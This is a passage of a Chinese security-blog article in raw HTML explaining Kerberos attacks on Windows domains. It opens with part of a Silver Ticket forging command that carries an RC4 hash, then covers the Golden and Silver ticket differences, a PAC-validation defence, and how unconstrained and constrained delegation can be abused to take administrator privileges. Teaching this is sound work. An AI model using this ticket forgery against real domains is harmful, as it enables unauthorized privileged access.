style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">S</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">5</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">21</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1812960810</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">2335050734</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">3517558805</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">target</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">OWA2010SP3</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0day</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">service</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">cifs </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">rc4</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">2c268a2a643267a4204a6ef6f896446b</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">user</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">administrator </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ptt</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.2679063360881543" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/28_zIjR5ya8zABTCL2uKudib6JIYPW4Ug.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaI1fuicGeadLTA3WVrgeibmuIibicNJzIjR5ya8zABTCL2uKudib6JIYPW4Ug/640?wx_fmt=png'" data-type="png" data-w="1452" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />3.查看票据<br style="-webkit-tap-highlight-color: transparent;"  /></p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.14103819784524976" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/29_MVdlM4lrwKSFoftbs3nw4kjnb850kQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIx9MOXMibBsicicdOI0rLYmVgib82MVdlM4lrwKSFoftbs3nw4kjnb850kQ/640?wx_fmt=png'" data-type="png" data-w="1021" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />4.访问域控<br style="-webkit-tap-highlight-color: transparent;"  /></p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5774783445620789" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/30_SAiaibibfwtia7Dd3htdg6rsTeewAA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIJL6AWZyEJqmckLW1jWDfFzxEgFFISAiaibibfwtia7Dd3htdg6rsTeewAA/640?wx_fmt=png'" data-type="png" data-w="1039" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">防御：<br style="-webkit-tap-highlight-color: transparent;"  />伪造的白银票据没有带有有效KDC签名的PAC。如果将目标主机配置为验证KDC PAC签名，则银票将不起作用。<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  /></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">3.白银票据和黄金票据的不同点</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">访问权限不同：<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  />黄金票据Golden Ticket：伪造TGT认购权证，可以获取任何Kerberos服务权限<br style="-webkit-tap-highlight-color: transparent;"  />白银票据Silver Ticket：伪造ST服务票据，只能访问指定的服务<br style="-webkit-tap-highlight-color: transparent;"  />加密方式不同：<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  />Golden Ticket由krbtgt的Hash加密<br style="-webkit-tap-highlight-color: transparent;"  />Silver Ticket 由服务账号（通常为计算机账户）Hash加密<br style="-webkit-tap-highlight-color: transparent;"  />认证流程不同：<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  />Golden Ticket的利用过程需要访问域控，<br style="-webkit-tap-highlight-color: transparent;"  />而Silver Ticket不需要<br style="-webkit-tap-highlight-color: transparent;"  /></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h1 style="margin: 2em auto 1em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 1em;padding-left: 1em;border-bottom: 2px solid rgb(15, 76, 129);">委派</h1><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />域委派是指，将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  />服务账号（Service Account），域内用户的一种类型，服务器运行服务时所用的账号，将服务运行起来并加入域。例如MS SQL Server在安装时，会在域内自动注册服务账号SqlServiceAccount，这类账号不能用于交互式登录。<br style="-webkit-tap-highlight-color: transparent;"  /></p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.45131086142322097" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/31_BrKt1HrnXVNWDELoCNZmA0MlUSe3Kw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIjDRlWxHbjibhkgeV14V1T8LCXBrKt1HrnXVNWDELoCNZmA0MlUSe3Kw/640?wx_fmt=png'" data-type="png" data-w="534" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />上图是经典的应用场景。一个域内普通用户jack通过Kerberos协议认证到前台WEB服后，前台运行WEB服务的服务账号websvc模拟（Impersonate）用户jack，以Kerberos协议继续认证到后台服务器，从而在后台服务器中获取jack用户的访问权限，即域中跳或者多跳的Kerberos认证。按照图中红色字体的数字，具体步骤如下：</p><p style="-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;padding-left: 1em;list-style: circle;"><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>域内用户jack以Kerberos方式认证后访问Web服务器；</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>Web服务以websvc服务账号运行，websvc向KDC发起jack用户的票据申请；</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>KDC检查websvc用户的委派属性，如果被设置，则返回jack用户的可转发票据TGT；</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>websvc收到jack用户TGT后，使用该票据向KDC申请访问文件服务器的服务票据TGS；</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>KDC检查websvc的委派属性，如果被设置，且申请的文件服务在允许的列表清单中，则返回一个jack用户访问文件服务的授权票据TGS；</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>websvc收到的jack用户的授权票据TGS后，可访问文件服务，完成多跳认证。</span></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  /><strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;">在域中，只有 服务账号 和 主机账号 才具有委派属性</strong><br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  />主机账号就是AD活动目录中 Computers 中的计算机，也可以称为机器账号(一个普通域用户默认最多可以创建十个主机账号)。<br style="-webkit-tap-highlight-color: transparent;"  />服务账号（Service Account）是域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来并加入域。例如SQL Server 在安装时，会在域内自动注册服务账号 SQLServiceAccount。也可以将域用户通过注册SPN变为服务账号。<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  /><strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;">委派的前提</strong><br style="-webkit-tap-highlight-color: transparent;"  /><strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;"></strong></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">需要被委派的用户未设置不允许被委派属性。<br style="-webkit-tap-highlight-color: transparent;"  /></p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.7531572904707233" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/32_3RdqO6FHopxBuwwwUy2gFsZlDNgicw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIMD3jTz7C2DFm7YiaKGxq9J3Hg93RdqO6FHopxBuwwwUy2gFsZlDNgicw/640?wx_fmt=png'" data-type="png" data-w="871" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p><br style=" -webkit-tap-highlight-color: transparent;color: rgb(0, 0, 0); text-align: start;white-space: normal; "  /><span style=" color: rgb(0, 0, 0); text-align: start; ">如果勾上则administrator账户不能被委派</span><br style=" -webkit-tap-highlight-color: transparent;color: rgb(0, 0, 0); text-align: start;white-space: normal; "  /></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h2 style="margin: 4em auto 2em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(255, 255, 255);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 0.2em;padding-left: 0.2em;background: rgb(15, 76, 129);">非约束性委派</a></h2><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />对于非约束性委派，服务账号可以获取被委派用户的<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">TGT</code>，并将<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">TGT</code>缓存到<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">LSASS</code>进程中，从而服务账号可使用该<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">TGT</code>，模拟用户访问任意服务。<br style="-webkit-tap-highlight-color: transparent;"  /></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">当服务账号或者主机被设置为非约束性委派时，其<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">userAccountControl</code>属性会包含<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">WORKSTATION_TRUSTED_FOR_DELEGATION</code><br style="-webkit-tap-highlight-color: transparent;"  /></p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.9149940968122786" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/33_8S28PzTwpo4KxMls88qfzukso2deVA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIG9O4sWRx2wgjgibFyQSkytEV78S28PzTwpo4KxMls88qfzukso2deVA/640?wx_fmt=png'" data-type="png" data-w="847" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p><br style=" -webkit-tap-highlight-color: transparent;color: rgb(0, 0, 0); text-align: start;white-space: normal; "  /></p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.7762162162162162" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/34_NmUxmibiagxTrU2543pOZuX7KHbrrA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIAO7GoXric16dicfF6AkXDgjESbM4NmUxmibiagxTrU2543pOZuX7KHbrrA/640?wx_fmt=png'" data-type="png" data-w="925" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />从网络攻击的角度看，如果攻击者控制了服务账号B，并诱骗管理员来访问服务A，则可以获取管理员的TGT，进而模拟管理员访问任意服务，即获得管理员权限。越是大型网络、应用越多的网络，服务账号越多，委派的应用越多，越容易获取域管理员权限。<br style="-webkit-tap-highlight-color: transparent;"  /></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h2 style="margin: 4em auto 2em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(255, 255, 255);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 0.2em;padding-left: 0.2em;background: rgb(15, 76, 129);">约束性委派</h2><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />由于非约束委派的不安全性，微软在Windows Server 2003中发布了约束性委派。对于约束性委派（Constrained Delegation），即Kerberos的两个扩展子协议 S4u2self (Service for User to Self) 和 S4u2Proxy (Service for User to Proxy )，服务账号只能获取用户的TGS，从而只能模拟用户访问特定的服务。<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  /></p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.7392550143266475" 